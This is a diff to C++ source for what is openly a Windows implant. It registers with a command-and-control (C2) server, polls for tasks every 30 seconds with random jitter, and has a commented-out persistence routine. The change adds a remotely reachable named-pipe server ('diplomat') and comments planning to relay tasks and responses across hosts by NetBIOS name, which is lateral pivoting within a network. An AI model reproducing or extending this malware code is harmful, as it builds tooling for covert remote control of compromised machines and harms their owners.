@@ -69,7 +69,7 @@ std::wstring MachineGUID(){
     return std::wstring(value, (int)size);
 }
 
-// Retrieve computer name
+// Retrieve NETBios computer name
 wchar_t* ComputerName(){
     wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
 	DWORD size = 30*sizeof(char);
@@ -280,29 +280,39 @@ void PersistMe(){
 }
 
 int _tmain(int argc, _TCHAR *argv[]){
-
     if(argc == 1){
         // Report intrusion to C2
         RegisterC2();
         //PersistMe();
+
+        // Create server
+        HANDLE hServer = CreateNamedPipeW(
+            L"\\\\.\\pipe\\diplomat",
+            (PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE),
+            (PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_ACCEPT_REMOTE_CLIENTS),
+            1,
+            2048,
+            2048,
+            0,
+            NULL
+        );
+
         // Periodically check for new commands from C2
         while(1){
             wchar_t* tasks = GetTasks();
             wprintf(L"%s\n", tasks);
 
+            //std::wstring path(L"HOST1, HOST2, HOST4");
+
+            // if path != NETBios name
+                // alter path and send message to next node
+                // if next node has response in named pipe server
+                    // take response and back propagate
+            // else
+                // execute tasks and put response in named pipe server
+
             int jitter = (rand() % 20000) - 10000;
             Sleep(30000+jitter);
         }
     }
-
-    HANDLE hServer = CreateNamedPipeW(
-        L"\\\\.\\talktome",
-        (PIPE_ACCESS_INBOUND | FILE_FLAG_FIRST_PIPE_INSTANCE),
-        (PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_ACCEPT_REMOTE_CLIENTS),
-        1,
-        2048,
-        2048,
-        0,
-        NULL
-    );
 }
